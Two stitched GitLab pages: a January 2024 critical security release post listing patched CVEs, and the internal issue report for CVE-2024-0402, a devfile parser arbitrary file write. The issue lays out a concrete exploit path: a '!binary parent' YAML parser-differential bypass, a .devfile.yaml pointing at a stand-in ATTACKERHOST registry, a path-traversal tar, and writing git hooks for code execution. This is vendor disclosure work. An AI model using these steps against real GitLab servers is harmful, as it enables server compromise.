=== Content from about.gitlab.com_c13d3f3f_20250115_100758.html ===


[←
Back to
releases](/releases/categories/releases/)
Jan 25, 2024

-
[Greg Myers](/company/team/#gitlab)
# GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8

Learn more about GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8 for GitLab Community Edition (CE) and Enterprise Edition (EE).

Today we are releasing versions 16.8.1, 16.7.4, 16.6.6, 16.5.8 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important security fixes, and we strongly recommend that all GitLab installations be upgraded to
one of these versions immediately. GitLab.com and GitLab Dedicated environments are already running the patched version.

GitLab releases patches for vulnerabilities in dedicated security releases. There are two types of security releases:
a monthly, scheduled security release, released a week after the feature release (which deploys on the 3rd Thursday of each month),
and ad-hoc security releases for critical vulnerabilities. For more information, you can visit our [security FAQ](https://about.gitlab.com/security/faq/).
You can see all of our regular and security release blog posts [here](/releases/categories/releases/).
In addition, the issues detailing each vulnerability are made public on our
[issue tracker](https://gitlab.com/gitlab-org/gitlab/-/issues/?sort=created_date&state=closed&label_name%5B%5D=bug%3A%3Avulnerability&confidential=no&first_page_size=100)
30 days after the release in which they were patched.

We are dedicated to ensuring all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. As part of maintaining good security hygiene, it is highly recommended that all customers
upgrade to the latest security release for their supported version. You can read more
[best practices in securing your GitLab instance](/blog/2020/05/20/gitlab-instance-security-best-practices/) in our blog post.

### Recommended Action

We **strongly recommend** that all installations running a version affected by the issues described below are **upgraded to the latest version as soon as possible**.

When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, this means all types are affected.

## Table of fixes

| Title | Severity |
| --- | --- |
| [Arbitrary file write while creating workspace](#arbitrary-file-write-while-creating-workspace) | Critical |
| [ReDoS in `Cargo.toml` blob viewer](#redos-in-cargotoml-blob-viewer) | Medium |
| [Arbitrary API PUT requests via HTML injection in user's name](#arbitrary-api-put-requests-via-html-injection-in-users-name) | Medium |
| [Disclosure of the public email in Tags RSS Feed](#disclosure-of-the-public-email-in-tags-rss-feed) | Medium |
| [Non-Member can update MR Assignees of owned MRs](#non-member-can-update-mr-assignees-of-owned-mrs) | Medium |

### Arbitrary file write while creating workspace

An issue has been discovered in GitLab CE/EE affecting all versions from 16.0 prior to 16.5.8, 16.6 prior to 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1 which allows an authenticated user to write files to arbitrary locations on the GitLab server while creating a workspace.
This is a critical severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`, 9.9).
It is now mitigated in the latest release and is assigned [CVE-2024-0402](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0402).

The fix for this security vulnerability has been backported to 16.5.8 in addition to 16.6.6, 16.7.4, and 16.8.1. GitLab 16.5.8 *only* includes a fix for this vulnerability and does *not* contain any of the other fixes or changes mentioned in this blog post.

This vulnerability has been discovered internally by GitLab team member [joernchen](https://gitlab.com/joernchen).

### ReDoS in `Cargo.toml` blob viewer

An issue has been discovered in GitLab CE/EE affecting all versions from 12.7 prior to 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1 It was possible for an attacker to trigger a Regular Expression Denial of Service via a `Cargo.toml` containing maliciously crafted input.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`, 6.5).
It is now mitigated in the latest release and is assigned [CVE-2023-6159](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6159).

Thanks [yvvdwf](https://hackerone.com/yvvdwf) for reporting this vulnerability through our HackerOne bug bounty program.

### Arbitrary API PUT requests via HTML injection in user's name

An issue has been discovered in GitLab CE/EE affecting all versions after 13.7 before 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1. Improper input sanitization of user name allows arbitrary API PUT requests.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`, 6.4).
It is now mitigated in the latest release and is assigned [CVE-2023-5933](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5933).

Thanks [yvvdwf](https://hackerone.com/yvvdwf) for reporting this vulnerability through our HackerOne bug bounty program.

### Disclosure of the public email in Tags RSS Feed

An issue has been discovered in GitLab affecting all versions before 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1. It was possible to read the user email address via tags feed although the visibility in the user profile has been disabled.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`, 5.3).
It is now mitigated in the latest release and is assigned [CVE-2023-5612](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5612).

Thanks [erruqill](https://hackerone.com/erruqill) for reporting this vulnerability through our HackerOne bug bounty program.

### Non-Member can update MR Assignees of owned MRs

An authorization vulnerability exists in GitLab versions 14.0 prior to 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1. An unauthorized attacker is able to assign arbitrary users to MRs that they created within the project .
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`, 4.3).
It is now mitigated in the latest release and is assigned [CVE-2024-0456](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0456).

Thanks to [Niklas](https://gitlab.com/Taucher2003) for reporting this vulnerability.

### Update xmlsoft/libxml2 to >= v2.11.6

The `xmlsoft/libxml2` version has been upgraded to 2.12.3 to mitigate [CVE-2023-45322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45322).

### Upgrade redis to address CVE-2023-41056 (Redis RCE)

Redis has been upgraded to version 7.0.15 to mitigate [CVE-2023-41056](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41056).

## Non Security Patches

### 16.8.1

* [Update dependency gitlab-glfm-markdown to '~> 0.0.11'](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142344)
* [Backport Redis migration to 16.8](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142307)
* [[Backport] Optimize garbage collection process](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142398)
* [[Backport] Bump GitLab Shell version to 14.33.0](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142628)

### 16.7.4

* [Backport - Bring legacy verification behavior back for repositories](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/141413)
* [Sync chef-gem and chef-bin (16.7)](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7352)

### 16.6.6

* [Backport: Move release-environments pipeline to be sourced from master](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/141821)
* [Backport - Bring legacy verification behavior back for repositories](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/141412)

## Updating

To update GitLab, see the [Update page](/update).
To update Gitlab Runner, see the [Updating the Runner page](https://docs.gitlab.com/runner/install/linux-repository.html#updating-the-runner).

## Receive Security Release Notifications

To receive security release blog notifications delivered to your inbox, visit our [contact us](https://about.gitlab.com/company/contact/) page.
To receive release notifications via RSS, subscribe to our [security release RSS feed](https://about.gitlab.com/security-releases.xml) or our [RSS feed for all releases](https://about.gitlab.com/all-releases.xml).

[GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8
via @gitlab

Click to tweet!](http://twitter.com/share?text=GitLab+Critical+Security+Release%3A+16.8.1%2C+16.7.4%2C+16.6.6%2C+16.5.8+via+%40gitlab&url=https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/&hashtags= "Tweet!")

* [security](/releases/tags.html#security)

[Share on Facebook](http://www.facebook.com/sharer.php?u=https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/)
[Share on X](http://x.com/share?url=https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/&text=GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8)
[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/&title=GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8&summary=&source=)
[Share on Hacker News](https://news.ycombinator.com/submitlink?u=https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/&t=GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8)

* [Previous Post:
  GitLab 16.8 released with Google Cloud Secret Manager
  ...](/releases/2024/01/18/gitlab-16-8-released/ "GitLab 16.8 released with Google Cloud Secret Manager support and the ability to speed up your builds with the Maven dependency proxy")
* [Next Post:
  GitLab Security Release: 16.8.2, 16.7.5, 16.6.7](/releases/2024/02/07/security-release-gitlab-16-8-2-released/ "GitLab Security Release: 16.8.2, 16.7.5, 16.6.7")

Sign up for GitLab's monthly newsletter

Thanks for subscribing!

### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab Critical Security Release: 16.8.1, 16.7.4, 16.6.6, 16.5.8&body=&tags=blog-feedback)

## Take GitLab for a spin

See what your team could do with The DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com)

![](/images/cta/gitlab-enterprise-team-member-photos.png)

Have a question? We're here to help.

[Talk to an expert](https://about.gitlab.com/sales/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/releases/posts/2024-01-25-critical-security-release-gitlab-16-8-1-released.html.md)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/releases/posts/2024-01-25-critical-security-release-gitlab-16-8-1-released.html.md)



=== Content from gitlab.com_79ebff4a_20250115_100800.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Devfile parser arbitrary file write

### Summary

For our ["workspaces"](https://docs.gitlab.com/ee/user/workspace/) feature we're using a [custom Gem](https://gitlab.com/gitlab-org/ruby/gems/devfile-gem/) to parse [devfiles](https://devfile.io/) which define those workspaces.

devfiles can include other devfiles as a "parent", those parents can be depending on the context local or remote files.
The remote files can come from different sources like Git repositories or a devfile registry which is very similar to a Docker registry.

Within GitLab we're not allowing the "parent" feature of devfiles and we're validating that a given devfile does not use it in <https://gitlab.com/gitlab-org/gitlab/-/blob/e261f7e36a061f547b75f45fed89baa4cd53a29e/ee/lib/remote_development/workspaces/create/pre_flatten_devfile_validator.rb#L50-56>

```
        def self.validate_parent(value)
          value => { devfile: Hash => devfile }

          return err(_("Inheriting from 'parent' is not yet supported")) if devfile['parent']

          Result.ok(value)
        end
```

devfiles are written in [YAML](https://yaml.org/) in the above code excerpt the underlying YAML is parsed by Ruby's
`YAML.safe_load` into a Hash, this Hash is then verified to not contain the `parent` key.

Subsequently the verified devfile YAML is passed on to some [Go binary](https://gitlab.com/gitlab-org/ruby/gems/devfile-gem/-/blob/main/ext/main.go?ref_type=heads) in the `devfile-gem`. Due to YAML being a complex format the
Ruby and the Go parser differ a bit and we can construct a YAML file which doesn't seem to have a `parent` key in
Ruby but has one in Go.

Consider the following Ruby program:

```
require 'yaml'
require 'date'
x = YAML.safe_load(File.read(ARGV[0]),aliases: true)
y = YAML.dump(x)
puts y
```

And this Go program:

```
package main

import (
        "fmt"
        "log"
        "os"
        "gopkg.in/yaml.v3"
)

func main() {
    data, _ := os.ReadFile(os.Args[1])
        unmarshalled := &yaml.Node{}

        err := yaml.Unmarshal([]byte(data), unmarshalled)
        if err != nil {
                log.Fatalf("error: %v", err)
        }
        var expanded interface{}
        err = unmarshalled.Content[0].Decode(&expanded)
        if err != nil {
                log.Fatalf("error: %v", err)
        }

        d, err := yaml.Marshal(expanded)
        if err != nil {
                log.Fatalf("error: %v", err)
        }
        fmt.Printf("%s\n", string(d))
}
```

With this input:

```
!binary parent: foo
```

We get the following different outputs:

```
➜  devfile cat test.yaml
!binary parent: foo
➜  devfile ruby r.rb test.yaml
---
!binary "pareng==": foo
➜  devfile go run g.go test.yaml
parent: foo

➜  devfile
```

So we can craft a `devfile` which actually has a `parent` defined and will be parsed by the devfile-gem underlying
Go implementation when creating a new workspace.

This Go implementation is vulnerable to a path traversal when dealing with registry based parents.
<https://github.com/devfile/registry-support/blob/47b3ffaeadba7babb7075e0576584cfaa3f64341/registry-library/library/util.go#L115>

```
target := path.Join(targetDir, filepath.Clean(header.Name))
```

Here the `header.Name` comes from an untrusted `tar` archive. `filepath.Clean` is not preventing
a traversal here as it will leave relative paths as they are so for instance `../../../etc/passwd` will not
get the `../` sequence removed.

### Steps to reproduce

1. set up a cluster agent with the following config:

```
remote_development:
  enabled: true

user_access:
  access_as:
    agent: {}
  projects:
    - id: SOMGROUP/SOMEPROJECT
  groups:
    - id: SOMEGROUP
```

Where `SOMEGROUP` is a premium namespace `SOMEPROJECT` will be configured now with a `.devfile.yaml` in the repo:

```
schemaVersion: 2.2.0
!binary parent:
    id: nodejs
    registryUrl: http://ATTACKERHOST
components:
  - name: 'test'
    attributes:
      gl/inject-editor: true
    container:
      image: registry.gitlab.com/gitlab-org/remote-development/gitlab-remote-development-docs/debian-bullseye-ruby-3.2-node-18.12:rubygems-3.4-git-2.33-lfs-2.9-yarn-1.22-graphicsmagick-1.3.36-gitlab-workspaces
```

The following tar file contains the script to run at `ATTACKERHOST`, it serves as fake registry server with a `archive.tar` which
contains a traversal into `/tmp/joernwashere`. [server.tar](/-/project/278964/uploads/2a769850c5b09fd947c38e8f46625aee/server.tar)

When everything is set up we can trigger the file write by creating a workspace for the project we just created the `.devfile.yaml` in.

On simple omnibus/docker installations where the repos are on the same host this leads to pretty easy code execution by writing e.g. git hooks into a repository.

### Relevant logs and/or screenshots

I'll provide a screenrecording with a walk through later on.

### Output of checks

#### Results of GitLab environment info

Expand for output related to GitLab environment info
```

root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   3.1.4p223
Gem Version:    3.4.22
Bundler Version:2.4.22
Rake Version:   13.0.6
Redis Version:  7.0.14
Sidekiq Version:6.5.12
Go Version:     unknown

GitLab information
Version:        16.7.0-ee
Revision:       9e7d34f7ff1
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     14.9
URL:            http://gitlab.example.com
HTTP Clone URL: http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        14.32.0
Repository storages:
- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell

Gitaly
- default Address:      unix:/var/opt/gitlab/gitaly/gitaly.socket
- default Version:      16.7.0
- default Git Version:  2.42.0

```
#### Results of GitLab application Check

Expand for output related to the GitLab application check
```

root@gitlab:/# gitlab-rake gitlab:check SANITIZE=true
Checking GitLab subtasks ...

Checking GitLab Shell ...

GitLab Shell: ... GitLab Shell version >= 14.32.0 ? ... OK (14.32.0)
Running /opt/gitlab/embedded/service/gitlab-shell/bin/check
Internal API available: OK
Redis available via internal API: OK
gitlab-shell self-check successful

Checking GitLab Shell ... Finished

Checking Gitaly ...

Gitaly: ... default ... OK

Checking Gitaly ... Finished

Checking Sidekiq ...

Sidekiq: ... Running? ... yes
Number of Sidekiq processes (cluster/worker) ... 1/1

Checking Sidekiq ... Finished

Checking Incoming Email ...

Incoming Email: ... Reply by email is disabled in config/gitlab.yml

Checking Incoming Email ... Finished

Checking LDAP ...

LDAP: ... LDAP is disabled in config/gitlab.yml

Checking LDAP ... Finished

Checking GitLab App ...

Database config exists? ... yes
Tables are truncated? ... skipped
All migrations up? ... yes
Database contains orphaned GroupMembers? ... no
GitLab config exists? ... yes
GitLab config up to date? ... yes
Cable config exists? ... yes
Resque config exists? ... yes
Log directory writable? ... yes
Tmp directory writable? ... yes
Uploads directory exists? ... yes
Uploads directory has correct permissions? ... yes
Uploads directory tmp has correct permissions? ... skipped (no tmp uploads folder yet)
Systemd unit files or init script exist? ... skipped (omnibus-gitlab has neither init script nor systemd units)
Systemd unit files or init script up-to-date? ... skipped (omnibus-gitlab has neither init script nor systemd units)
Projects have namespace: ...
1/1 ... yes
3/2 ... yes
3/3 ... yes
Redis version >= 6.0.0? ... yes
Ruby version >= 3.0.6 ? ... yes (3.1.4)
Git user has default SSH configuration? ... yes
Active users: ... 1
Is authorized keys file accessible? ... yes
GitLab configured to store new projects in hashed storage? ... yes
All projects are in hashed storage? ... yes
Elasticsearch version 7.x-8.x or OpenSearch version 1.x ... skipped (Advanced Search is disabled)
All migrations must be finished before doing a major upgrade ... skipped (Advanced Search is disabled)

Checking GitLab App ... Finished

Checking GitLab subtasks ... Finished

```

Edited Jan 25, 2024 by [Rohit Shambhuni](/rshambhuni)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


